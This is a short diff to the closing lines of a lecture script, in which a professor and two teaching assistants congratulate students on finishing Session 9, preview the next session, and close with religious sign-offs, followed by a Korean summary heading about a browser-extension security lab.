-[TA Sarah] In our next session, Session 10, we unleash the true power of autonomous development: Antigravity 2.0 and 93-Agent Swarms!
+[TA James] James and I will be holding lab office hours to help you optimize your pipelines and crush every bug!
 
-[Prof. Peter] On behalf of TA Sarah Jenkins, TA James Wilson, and the entire Smart Insight Lab, congratulations on mastering Session 9! Soli Deo Gloria, and we will see you in Session 10!
+[Prof. Peter] As we always proclaim at Oikos University: Knowledge without practice is inert, but practiced wisdom dedicated to God's glory transforms the world.
+
+[TA Sarah] In our next session, we will push our architectural capabilities even further into the sovereign frontier!
+
+[TA James] Don't wait until tomorrow—fire up your terminal tonight, run your tests, and redeem your time!
+
+[Prof. Peter] On behalf of TA Sarah Jenkins, TA James Wilson, and Smart Insight Lab: Thank you for your dedication. Soli Deo Gloria! Class dismissed in victory!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 실습 과제 9 및 세션 마무리: 매니페스트 V3 기반 보안 요새 확장 프로그램 제작 및 감사
